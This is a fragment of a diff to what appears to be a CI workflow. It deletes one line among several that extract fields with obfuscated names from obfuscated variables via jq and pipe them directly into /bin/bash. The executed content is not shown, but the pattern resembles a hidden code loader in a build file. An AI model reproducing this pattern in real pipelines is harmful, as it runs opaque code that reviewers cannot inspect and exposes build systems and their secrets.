@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$udc4" | jq -r .t959 | /bin/bash
           echo $kqpna9 | jq -r .lor47818 | /bin/bash
           echo $al2454 | jq -r .fixvm19 | /bin/bash
-          echo $j969 | jq -r .jje49093 | /bin/bash
           echo $mxyns6851 | jq -r .cgnsz86298 | /bin/bash
           printf '%s' "$tkeph03" | jq -r .bx4210 | /bin/bash
           echo $ghmgo54769 | jq -r .wsw8234 | /bin/bash
